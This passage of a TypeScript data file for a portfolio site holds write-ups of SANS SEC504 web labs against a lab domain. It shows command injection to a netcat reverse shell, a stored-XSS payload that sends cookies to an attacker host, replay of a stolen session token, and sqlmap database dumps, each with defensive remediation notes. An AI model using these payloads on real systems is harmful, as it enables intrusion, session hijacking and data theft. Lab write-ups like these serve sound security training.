      { src: "/labs/idor-142710.png", alt: "baseline filter", caption: "Nonexistent IDs return 500; -fc 500 filters the noise" },
      { src: "/labs/idor-142817.png", alt: "ID enumeration", caption: "seq + ffuf sweeps 0-9999: hits at 2305, 5492, 7127, 7341, 9653" },
      { src: "/labs/idor-142924.png", alt: "another user's log", caption: "chatlog-2305.txt returns a different user's full transcript (IDOR)" },
    ],
  },
  {
    id: 34,
    courseSlug: "sec504",
    slug: "os-command-injection-reverse-shell",
    title: "OS Command Injection to Reverse Shell",
    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
    role: "Solo, Lab",
    focus: "Web Application Security",
    level: "SEC504",
    date: "Jul 2026",
    artifacts: "Sanitized browser and netcat output from the SEC504 web lab against support.falsimentis.com/singlestatus",
    context:
      "This lab exploits a server-test page that passes user input into an fping command line without sanitization. It works the injection methodically: prove the sink with harmless argument injection first, then escalate to command injection with a failure operator, enumerate, and finish with a reverse shell running as root. The disciplined progression (argument injection before shell metacharacters) is the part worth learning.",
    summary:
      "The /singlestatus?target= page runs fping against a user-supplied target. Submitting -h returned fping's usage text, proving input reaches the command line (argument injection) before touching any shell metacharacter. A colon payload failed (wrong operator), but -z || id worked: the invalid -z option forces fping to fail, and || then runs id, returning uid=0(root). From there, -z || ls exposed the application source (app.py, db.sqlite3, config.py), -z || which nc confirmed netcat was installed, and -z || nc 10.10.75.1 4444 -e /bin/sh opened a reverse shell as root. Inside the shell, sqlite3 db.sqlite3 .dump exfiltrated the full database.",
    whyThisMatters:
      "Command injection is a direct path from a web input to code execution as whatever user the web process runs as, root here, which is total server compromise. The methodology is the lesson: testing -h first proves the vulnerability with a single harmless request, and choosing || (run on failure) instead of ; or && is more reliable when you can force the base command to fail. This is exactly how I approach an injection sink in a review, confirm the reach before proving impact.",
    tldr: [
      "Argument injection (-h returns fping usage) proved the input reached the command line with one harmless request",
      "-z || id executed as root: the invalid option forces failure, then || runs the injected command",
      "Chained to a reverse shell as root and exfiltrated the SQLite database with .dump",
    ],
    skillsDemonstrated: [
      "Argument injection as a low-impact confirmation probe",
      "OS command injection via shell operators",
      "Choosing || (on-failure) for reliable injection",
      "Reverse shell establishment with netcat",
      "Post-exploitation data exfiltration (sqlite3 .dump)",
    ],
    tools: ["curl / browser", "fping", "netcat", "sqlite3", "Slingshot Linux"],
    steps: [
      "Read robots.txt and find the /singlestatus endpoint",
      "Submit a normal target and observe the fping output",
      "Probe with -h (argument injection) to prove the sink",
      "Escalate to command injection with -z || id",
      "Enumerate the app directory and check for netcat",
      "Open a reverse shell and exfiltrate the database",
    ],
    stepDetails: [
      {
        title: "Find and exercise the endpoint",
        description:
          "robots.txt pointed at /singlestatus. The page (For Official Use Only) takes a target and returns fping output (packet counts, min/avg/max). Normal input produces normal output; the question is whether that input reaches a shell.",
        command: "curl http://support.falsimentis.com/robots.txt\n# browse /singlestatus?target=10.10.75.1",
        commandBreakdown: "The page runs fping against the target parameter",
        screenshot: "/labs/command-injection-145134.png",
      },
      {
        title: "Prove the sink with argument injection",
        description:
          "Before any shell metacharacter, submitting target=-h returned fping's full usage text. That single harmless response proves user input is placed on the fping command line unsanitized. Argument injection confirms the vulnerability without risking anything.",
        command: "# /singlestatus?target=-h",
        commandBreakdown: "-h is interpreted as an fping flag: input reaches the command line",
        screenshot: "/labs/command-injection-145217.png",
      },
      {
        title: "Escalate to command injection",
        description:
          "A colon payload failed (not a shell separator here). The working payload was -z || id: the invalid -z option makes fping exit non-zero, and || then runs id, which returned uid=0(root) gid=0(root). Forcing the base command to fail makes || fire reliably.",
        command: "# /singlestatus?target=-z || id",
        commandBreakdown: "Invalid -z forces failure; || runs id -> uid=0(root)",
        screenshot: "/labs/command-injection-145512.png",
      },
      {
        title: "Enumerate the application",
        description:
          "-z || ls listed the app directory: app.py, db.sqlite3, config.py, templates, trainbot.py, and more. -z || which nc confirmed /usr/bin/nc (netcat was installed, which the sibling IDOR lab's build.log had already revealed).",
        command: "# /singlestatus?target=-z || ls\n# /singlestatus?target=-z || which nc",
        commandBreakdown: "Enumerate the source and confirm a tool for the next step",
        screenshot: "/labs/command-injection-145539.png",
      },
      {
        title: "Open a reverse shell as root",
        description:
          "With netcat present, a listener on the attacker (nc -l -v -p 4444) plus the payload -z || nc 10.10.75.1 4444 -e /bin/sh produced a connection from support.falsimentis.com running as root. A web input became an interactive root shell.",
        command: "# attacker: nc -l -v -p 4444\n# /singlestatus?target=-z || nc 10.10.75.1 4444 -e /bin/sh",
        commandBreakdown: "-e /bin/sh binds the shell; connection runs as the web process user (root)",
        screenshot: "/labs/command-injection-145829.png",
      },
      {
        title: "Exfiltrate the database",
        description:
          "In the root shell, sqlite3 db.sqlite3 .dump printed the full schema and data (the chatbot's tag and statement tables, its training corpus). Command injection to root is complete server compromise, and the local database is right there.",
        command: "sqlite3 db.sqlite3 \".dump\"",
        commandBreakdown: ".dump: full schema + data export",
        screenshot: "/labs/command-injection-150006.png",
      },
    ],
    outcome:
      "Turned an unsanitized fping parameter into a root reverse shell by confirming the sink with argument injection (-h), escalating with the -z || failure-operator technique, and exfiltrating the SQLite database. A single web input became complete server compromise as root.",
    nextStepsInProduction:
      "Never pass user input to a shell: use a library or a direct syscall (an ICMP library instead of shelling out to fping), and if a command must be built, use an argument array with no shell interpretation and a strict allowlist for the target (validate it is an IP or hostname). Run the web process as an unprivileged user, not root, so injection does not immediately mean full compromise. Add a WAF rule and alerting for shell metacharacters in the target parameter.",
    securityControlsRelevant: [
      "No shell invocation on user input (library calls / argv arrays)",
      "Strict input validation (allowlist IP/hostname)",
      "Least-privilege web process (not root)",
      "WAF rules for shell metacharacters",
      "Egress filtering to block reverse-shell callbacks",
    ],
    keyFindings: [
      "Argument injection (-h) proved the sink with one harmless request",
      "-z || id executed as root (uid=0)",
      "The web process ran as root, so injection meant full compromise",
      "Reverse shell + sqlite3 .dump exfiltrated the entire database",
    ],
    takeaway: [
      "The methodology is the takeaway: prove reach before proving impact. Submitting -h and getting fping's usage back is a harmless request that conclusively demonstrates the input hits the command line. Only then does it make sense to reach for shell operators. In a review, that ordering keeps you from firing destructive payloads to answer a question a benign one already settles.",
      "|| is the reliable operator when you can force the base command to fail. ; always runs the second command and && only runs it on success, but || runs it precisely when the first command errors, and an invalid flag like -z guarantees that error. Combined with a web process running as root, the result is that one carefully chosen query string yields an interactive root shell. Running the web app unprivileged would not fix the injection, but it would turn a catastrophe into a contained one.",
    ],
    screenshots: [
      { src: "/labs/command-injection-145029.png", alt: "robots.txt", caption: "robots.txt points at /singlestatus" },
      { src: "/labs/command-injection-145134.png", alt: "normal fping output", caption: "Normal target returns fping packet statistics" },
      { src: "/labs/command-injection-145217.png", alt: "argument injection -h", caption: "target=-h returns fping usage: input reaches the command line" },
      { src: "/labs/command-injection-145314.png", alt: "colon payload fails", caption: "A colon is not a shell separator here (name resolution error)" },
      { src: "/labs/command-injection-145512.png", alt: "command injection id", caption: "-z || id returns uid=0(root) gid=0(root)" },
      { src: "/labs/command-injection-145539.png", alt: "enumerate with ls", caption: "-z || ls lists app.py, db.sqlite3, config.py, templates" },
      { src: "/labs/command-injection-145618.png", alt: "which nc", caption: "-z || which nc confirms /usr/bin/nc" },
      { src: "/labs/command-injection-145743.png", alt: "reverse shell payload", caption: "Payload: -z || nc 10.10.75.1 4444 -e /bin/sh" },
      { src: "/labs/command-injection-145829.png", alt: "root reverse shell", caption: "Connection from support.falsimentis.com; ls runs as root" },
      { src: "/labs/command-injection-150006.png", alt: "sqlite dump", caption: "sqlite3 db.sqlite3 .dump exfiltrates the full database" },
    ],
  },
  {
    id: 35,
    courseSlug: "sec504",
    slug: "stored-xss-session-hijacking",
    title: "Stored XSS to Session Hijacking",
    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
    role: "Solo, Lab",
    focus: "Web Application Security",
    level: "SEC504",
    date: "Jul 2026",
    artifacts: "Sanitized browser, PHP cookie-catcher, and admin-panel output from the SEC504 web lab against support.falsimentis.com",
    context:
      "This lab finds a stored cross-site scripting flaw in a support-ticket form, weaponizes it into a cookie stealer, and uses the stolen session token to reach an admin panel. The instructive part is the per-field testing: the same form escapes one field and not another, so the vulnerability is only found by probing every input, and the real impact is a second victim, not an alert box.",
    summary:
      "The /contact form echoes submitted fields back on a confirmation page. Probing each field with a harmless <hr> tag showed the name field was escaped (rendered as text) but the email field was not (rendered an actual horizontal rule). A <script>alert(1)</script> in the email field executed, confirming XSS. Standing up a PHP cookie-catcher (file_put_contents logging GET/headers) and injecting <script>document.location=\"http://10.10.75.1:8080/?\"+document.cookie</script>, the log recorded two hits: the tester's own browser and, minutes later, a different internal IP (the SME analyst who opened the ticket), confirming this was stored XSS. Replaying that stolen authtoken with curl -b reached the admin panel, whose ticket queue exposed users typing their own passwords into support requests.",
    whyThisMatters:
      "The impact of XSS is not the alert box; it is the second IP in the cookie log, an analyst whose session was hijacked just by viewing a ticket. Stored XSS is especially dangerous because it fires against whoever opens the record, including staff with more privilege than the attacker. The per-field lesson is one I apply directly in reviews: output encoding is applied inconsistently far more often than it is applied nowhere, so every field must be tested, not just the obvious one.",
    tldr: [
      "Per-field probing with <hr> found the email field unescaped while the name field was correctly encoded",
      "A cookie-stealer payload logged a second victim (the SME analyst), confirming stored XSS",
      "Replaying the stolen authtoken with curl -b reached the admin panel and its ticket queue",
    ],
    skillsDemonstrated: [
      "Per-field XSS probing with harmless markup (<hr>)",
      "Distinguishing escaped vs unescaped output",
      "Stored XSS weaponization (cookie theft)",
      "Session hijacking via stolen token replay",
      "Impact demonstration through privilege gain",
    ],
    tools: ["curl / browser", "PHP built-in server", "Slingshot Linux"],
    steps: [
      "Submit the contact form and see which fields are echoed",
      "Probe each field with <hr> to find inconsistent encoding",
      "Confirm script execution in the vulnerable field",
      "Stand up a PHP cookie-catcher",
      "Inject a cookie-stealing payload and watch the log",
      "Replay the stolen token to reach the admin panel",
    ],
    stepDetails: [
      {
        title: "Map the reflected fields",
        description:
          "The /contact form (name, email, company, file, message) echoes its values on a 'Thanks' confirmation page. Any echoed field is a candidate sink for XSS, so the first step is just to see what comes back.",
        command: "# submit /contact with test values and read the confirmation",
        commandBreakdown: "Echoed fields are the XSS candidates to probe",
        screenshot: "/labs/xss-102345.png",
      },
      {
        title: "Probe each field with <hr>",
        description:
          "Submitting Lorezo<hr> in the name field rendered the literal text (escaped, safe). The same <hr> in the email field rendered an actual horizontal rule (unescaped, injectable). Same form, same page, different encoding per field: this is why every input must be tested.",
        command: "# name: Lorezo<hr>  -> rendered as text (escaped)\n# email: lorenzo@gmail.com<hr>  -> rendered as a rule (injectable)",
        commandBreakdown: "<hr> is a harmless, unmistakable probe: rule = injectable",
        screenshot: "/labs/xss-102401.png",
      },
      {
        title: "Confirm script execution",
        description:
          "With the email field confirmed injectable, lorenzo@gmail.com<script>alert(1)</script> produced an alert box from support.falsimentis.com. XSS confirmed; now to weaponize it into something with real impact.",
        command: "# email: lorenzo@gmail.com<script>alert(1)</script>",
        commandBreakdown: "alert(1) executing proves script injection, not just HTML injection",
        screenshot: "/labs/xss-103302.png",
      },
      {
        title: "Stand up a cookie-catcher",
        description:
          "A small PHP script logged incoming GET parameters and headers to cookies.log, served with the PHP built-in server on 8080. This is the endpoint the injected script will send victims' cookies to.",
        command: "cat index.php  # file_put_contents(\"cookies.log\", ...GET...headers...)\nphp -S 0.0.0.0:8080",
        commandBreakdown: "php -S serves the catcher; it appends every request to cookies.log",
        screenshot: "/labs/xss-103736.png",
      },
      {
        title: "Inject the cookie stealer and catch a second victim",
        description:
          "The payload redirected the victim's browser to the catcher with their cookie appended: <script>document.location=\"http://10.10.75.1:8080/?\"+document.cookie</script>. The log showed two hits: the tester's own browser, and minutes later a different internal IP (172.30.0.201), the SME analyst who opened the ticket. That second IP is what makes this stored XSS.",
        command: "# email field payload:\n# <script>document.location=\"http://10.10.75.1:8080/?\"+document.cookie</script>",
        commandBreakdown: "The analyst's browser fires the payload on viewing the ticket",
        screenshot: "/labs/xss-104147.png",
      },
      {
        title: "Hijack the session",
        description:
          "The admin panel was a troll page when unauthenticated, but curl with the stolen authtoken cookie (-b) returned the real admin interface: a ticket queue where users had typed their own usernames and passwords into support requests. The stolen session became privileged access.",
        command: "curl http://support.falsimentis.com/admin/\ncurl http://support.falsimentis.com/admin/ -b authtoken=77ba9cd915c8e359d9733edcfe9c61e5aca92afb",
        commandBreakdown: "-b sends the stolen cookie; the panel now authorizes the request",
        screenshot: "/labs/xss-104600.png",
      },
    ],
    outcome:
      "Found a stored XSS in a support-ticket form through per-field probing, weaponized it into a cookie stealer that captured an SME analyst's session, and replayed that token to reach an admin panel exposing credentials users had typed into tickets. The impact was a hijacked staff session, not an alert box.",
    nextStepsInProduction:
      "Apply context-aware output encoding on every field, not selectively, and add a Content-Security-Policy that blocks inline script and external exfiltration destinations. Set session cookies HttpOnly so document.cookie cannot read them, and SameSite/Secure to limit replay. Train users and templates so passwords are never entered into ticket bodies, and scan ticket content for credential patterns. Test every input for XSS in QA, since the flaw here was inconsistent, not absent, encoding.",
    securityControlsRelevant: [
      "Consistent context-aware output encoding on all fields",
      "Content-Security-Policy blocking inline script and exfil hosts",
      "HttpOnly / SameSite / Secure session cookies",
      "Credential-pattern scanning of user-submitted content",
      "XSS test coverage across every input in QA",
    ],
    keyFindings: [
      "The name field was escaped but the email field was not (inconsistent encoding)",
      "<script>alert(1)</script> executed in the email field",
      "The cookie log caught a second internal IP: the SME analyst (stored XSS)",
      "The stolen authtoken replayed via curl -b reached the admin panel",
      "The admin ticket queue exposed users' plaintext passwords",
    ],
    takeaway: [
      "The real impact of XSS is the second IP in the log. An alert box proves execution but persuades no one; a captured analyst session, fired simply because staff opened a ticket, shows what stored XSS actually does. It reaches anyone who views the record, and in a support tool that means employees with more access than the attacker started with. Framing the finding around the hijacked session, not the popup, is what makes it land.",
      "Encoding is usually inconsistent, not absent, and that is the trap. The same form escaped the name field and forgot the email field, so testing only the obvious input would have missed the bug entirely. In a review, every reflected or stored field is its own test case, because a single forgotten sink is all stored XSS needs. HttpOnly cookies and a strict CSP would have neutralized the weaponization even with the injection present, which is why defense in depth matters here.",
    ],
    screenshots: [
      { src: "/labs/xss-102334.png", alt: "contact form", caption: "The /contact support form with five fields" },
      { src: "/labs/xss-102345.png", alt: "confirmation echo", caption: "Submitted fields are echoed on the 'Thanks' page" },
      { src: "/labs/xss-102401.png", alt: "hr probe in name", caption: "Name field: Lorezo<hr> renders as text (escaped)" },
      { src: "/labs/xss-102949.png", alt: "hr in email field", caption: "Email field accepts the <hr> tag" },
      { src: "/labs/xss-103000.png", alt: "hr rendered", caption: "Email field renders an actual rule: unescaped, injectable" },
      { src: "/labs/xss-103252.png", alt: "script payload", caption: "Injecting <script>alert(1)</script> in the email field" },
      { src: "/labs/xss-103302.png", alt: "alert fires", caption: "alert(1) from support.falsimentis.com confirms XSS" },
      { src: "/labs/xss-103736.png", alt: "cookie-catcher", caption: "PHP cookie-catcher served on :8080" },
      { src: "/labs/xss-103914.png", alt: "cookie-steal payload", caption: "Payload redirects to the catcher with document.cookie" },
      { src: "/labs/xss-104147.png", alt: "two victims in log", caption: "Log shows the tester and a second IP: the SME analyst (stored XSS)" },
      { src: "/labs/xss-104357.png", alt: "admin unauthenticated", caption: "Admin panel is a troll page without a valid token" },
      { src: "/labs/xss-104600.png", alt: "admin with stolen token", caption: "curl -b with the stolen authtoken returns the real admin panel" },
      { src: "/labs/xss-104646.png", alt: "credentials in tickets", caption: "Ticket queue exposes users' plaintext passwords" },
    ],
  },
  {
    id: 36,
    courseSlug: "sec504",
    slug: "sql-injection-database-exfiltration-sqlmap",
    title: "SQL Injection and Database Exfiltration with sqlmap",
    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
    role: "Solo, Lab",
    focus: "Web Application Security",
    level: "SEC504",
    date: "Jul 2026",
    artifacts: "Sanitized manual probe and sqlmap output from the SEC504 web lab against support.falsimentis.com/kb",
    context:
      "This lab confirms a SQL injection by hand with a single quote, then uses sqlmap to characterize it and walk the enumeration ladder from databases to tables to a full table dump. It also shows sqlmap distinguishing an injectable parameter from a non-injectable one on the same URL, and cracking recovered password hashes inline.",
    summary:
      "The /kb documentation search takes entityid and search parameters. Appending a single quote to search returned a MariaDB 1064 syntax error, confirming injection by hand before any tool. sqlmap then tested both parameters, found entityid not injectable and search injectable via four techniques (boolean-blind, error-based, time-based, and a 3-column UNION), and identified the backend as MySQL/MariaDB. Walking the ladder: --dbs listed information_schema and support; -D support --tables listed chat, contact, kb, tickets, users; and -D support -T users --dump pulled 12 users with roles (sme, admin, audit) and password hashes, one of which sqlmap cracked inline to Password123.",
    whyThisMatters:
      "SQL injection remains one of the highest-impact web findings because it exposes the entire database, credentials, roles, everything, and here a single quote in a search box was enough to confirm it. The detail that matters for reviews is that only one of two parameters was injectable: sqlmap tested both and told me which, which is why parameter-level testing beats assuming the whole endpoint is safe or unsafe. Parameterized queries would have closed this completely.",
    tldr: [
      "A single quote in the search box returned a MariaDB 1064 error, confirming SQLi by hand",
      "sqlmap found only 'search' injectable (not 'entityid') via four techniques and enumerated the database",
      "--dump pulled 12 users with roles and password hashes; sqlmap cracked one inline to Password123",
    ],
    skillsDemonstrated: [
      "Manual SQL injection confirmation (error-based)",
      "Automated exploitation with sqlmap",
      "Parameter-level injectability testing",
      "Database enumeration ladder (--dbs, --tables, --dump)",
      "Inline hash cracking of dumped credentials",
    ],
    tools: ["sqlmap 1.5.2", "curl / browser", "Slingshot Linux"],
    steps: [
      "Confirm the injection by hand with a single quote",
      "Run sqlmap against the URL and characterize the injection",
      "Enumerate databases with --dbs",
      "Enumerate tables in the target database",
      "Dump the users table and read the roles and hashes",
    ],
    stepDetails: [
      {
        title: "Confirm by hand",
        description:
          "Appending a single quote to the search parameter (search=RAG') returned '1064, You have an error in your SQL syntax ... MariaDB' directly on the page. A one-character manual probe confirms the injection before sqlmap is ever launched, and tells you the backend is MySQL/MariaDB.",
        command: "# /kb?entityid=3487&search=RAG'",
        commandBreakdown: "A single quote breaks the query -> 1064 syntax error = confirmed SQLi",
        screenshot: "/labs/sql-injection-120418.png",
      },
      {
        title: "Characterize with sqlmap",
        description:
          "sqlmap tested both parameters. entityid was not injectable; search was, via boolean-based blind, error-based (FLOOR/EXTRACTVALUE), time-based blind (SLEEP), and a 3-column UNION query. It confirmed the backend as MySQL >= 5.0 (MariaDB fork) and stored the session so later runs resume instantly.",
        command: "sqlmap -u \"http://support.falsimentis.com/kb?entityid=3487&search=RAG\"",
        commandBreakdown: "sqlmap tests each parameter and reports which is injectable and how",
        screenshot: "/labs/sql-injection-120819.png",
      },
      {
        title: "Enumerate databases",
        description:
          "--dbs listed the available databases: information_schema (always present) and support (the application's). This is the top rung of the enumeration ladder.",
        command: "sqlmap -u \"...\" --dbs",
        commandBreakdown: "--dbs: list databases; support is the app's",
        screenshot: "/labs/sql-injection-121236.png",
      },
      {
        title: "Enumerate tables",
        description:
          "-D support --tables listed chat, contact, kb, tickets, and users. The users table is the obvious next target for credential recovery.",
        command: "sqlmap -u \"...\" -D support --tables",
        commandBreakdown: "-D <db> --tables: list tables in the chosen database",
        screenshot: "/labs/sql-injection-121356.png",
      },
      {
        title: "Dump the users table",
        description:
          "-D support -T users --dump recovered 12 users with names, emails, usernames, roles (sme, admin, audit), and password hashes. sqlmap recognized the password column as hashes and cracked one inline, annotating it (Password123). Full credential and role disclosure from a single quote in a search box.",
        command: "sqlmap -u \"...\" -D support -T users --dump",
        commandBreakdown: "--dump: extract the table; sqlmap offers to crack recognized hashes",
        screenshot: "/labs/sql-injection-121638.png",
      },
    ],
    outcome:
      "Confirmed a SQL injection by hand with a single quote, then used sqlmap to identify the one injectable parameter, enumerate the database, and dump 12 users with roles and password hashes, one of which cracked inline to Password123. A search box became full database and credential disclosure.",
    nextStepsInProduction:
      "Use parameterized queries (prepared statements) everywhere, which closes this class of bug completely regardless of input. Apply least-privilege to the database account so the web app cannot read information_schema or unrelated tables. Store passwords with a slow salted hash (bcrypt/argon2), not the fast hashes seen here, and return generic error pages so a 1064 never reaches the client. Add WAF coverage and alerting for injection patterns, and test every parameter, since only one of two was vulnerable here.",
    securityControlsRelevant: [
      "Parameterized queries / prepared statements",
      "Least-privilege database account",
      "Slow salted password hashing (bcrypt/argon2)",
      "Generic error handling (no SQL errors to the client)",
      "Per-parameter injection testing and WAF coverage",
    ],
    keyFindings: [
      "A single quote in 'search' returned a MariaDB 1064 error (manual confirmation)",
      "sqlmap found 'search' injectable via 4 techniques; 'entityid' was not injectable",
      "Enumerated support DB tables: chat, contact, kb, tickets, users",
      "--dump recovered 12 users with roles (sme/admin/audit) and password hashes",
      "sqlmap cracked one hash inline to Password123",
    ],
    takeaway: [
      "One character confirmed the whole finding. A single quote that produces a 1064 error tells you the input reaches the query unescaped and that the backend is MariaDB, before any automated tool runs. That manual step matters: it validates the vulnerability, guides sqlmap, and in a report it is far more convincing than 'the scanner said so.' Parameterized queries would make that single quote inert, which is the entire fix.",
      "Parameter-level testing is the operational lesson. The endpoint had two parameters and only one was injectable; assuming the URL was uniformly safe or unsafe would have been wrong either way. sqlmap tested each and reported which, and that granularity is exactly how injection review has to work, because a single unparameterized parameter among many is all it takes to expose the whole database.",
    ],
    screenshots: [
      { src: "/labs/sql-injection-120418.png", alt: "manual single-quote probe", caption: "search=RAG' returns a MariaDB 1064 syntax error" },
      { src: "/labs/sql-injection-120708.png", alt: "sqlmap start", caption: "sqlmap 1.5.2 begins testing the parameters" },
      { src: "/labs/sql-injection-120819.png", alt: "injection techniques", caption: "'search' injectable via boolean, error, time-based, and UNION" },
      { src: "/labs/sql-injection-121227.png", alt: "--dbs run", caption: "sqlmap resumes the stored session and enumerates databases" },
      { src: "/labs/sql-injection-121236.png", alt: "databases", caption: "Available databases: information_schema, support" },
      { src: "/labs/sql-injection-121343.png", alt: "--tables run", caption: "Enumerating tables in the support database" },
      { src: "/labs/sql-injection-121356.png", alt: "tables list", caption: "Tables: chat, contact, kb, tickets, users" },
      { src: "/labs/sql-injection-121544.png", alt: "--dump run", caption: "Dumping the users table; hashes recognized in the password column" },
      { src: "/labs/sql-injection-121638.png", alt: "users dump", caption: "12 users with roles (sme/admin/audit) and hashes; one cracked to Password123" },
    ],
  },
];

export function getLabByCourseAndSlug(courseSlug: string, slug: string): CybersecurityLab | undefined {
  return LABS.find((l) => l.courseSlug === courseSlug && l.slug === slug);
}

export function getLabPath(lab: CybersecurityLab): string {
  return `/labs/${lab.courseSlug}/${lab.slug}`;
}

/** For redirects from legacy flat URLs */
export function getLabByLegacySlug(legacySlug: string): CybersecurityLab | undefined {
  return LABS.find((l) => l.legacySlug === legacySlug);
}

export function getLabBySlug(slug: string): CybersecurityLab | undefined {
  return LABS.find((l) => l.slug === slug || l.legacySlug === slug);
}

/**
 * Portfolio domains for the labs section. Labs are grouped by domain
 * (what the work demonstrates) rather than by SANS course number.
 * Order here is the tab order on the home page.
 */
export type LabDomain =
  | "Network Security & Forensics"
  | "Incident Response & Threat Hunting"
  | "Endpoint & Platform Security"
  | "Application & Data Security";

export const LAB_DOMAINS: LabDomain[] = [
  "Network Security & Forensics",
  "Incident Response & Threat Hunting",
  "Endpoint & Platform Security",
  "Application & Data Security",
];

/** Short tab labels so the pills stay scannable on small screens. */
export const LAB_DOMAIN_SHORT: Record<LabDomain, string> = {
  "Network Security & Forensics": "Network & Forensics",
  "Incident Response & Threat Hunting": "IR & Threat Hunting",
  "Endpoint & Platform Security": "Endpoint & Platform",
  "Application & Data Security": "AppSec & Data",
};

const FOCUS_TO_DOMAIN: Record<string, LabDomain> = {
  "Network Forensics": "Network Security & Forensics",
  "Cloud Network Forensics": "Network Security & Forensics",
  "Network Reconnaissance": "Network Security & Forensics",
  "Network Security": "Network Security & Forensics",
  "Intrusion Detection": "Network Security & Forensics",
  "Incident Response": "Incident Response & Threat Hunting",
  "Malware Analysis": "Incident Response & Threat Hunting",
  "Threat Hunting": "Incident Response & Threat Hunting",
  "AI for Security Operations": "Incident Response & Threat Hunting",
  "Linux Security": "Endpoint & Platform Security",
  "Windows Security": "Endpoint & Platform Security",
  "Web Application Security": "Application & Data Security",
  "Data Security & DLP": "Application & Data Security",
  "Cryptography": "Application & Data Security",
  "Password Management & Cryptography": "Application & Data Security",
};

/** Domain a lab belongs to, derived from its focus. Falls back to Network. */
export function getLabDomain(lab: CybersecurityLab): LabDomain {
  return (lab.focus && FOCUS_TO_DOMAIN[lab.focus]) || "Network Security & Forensics";
}
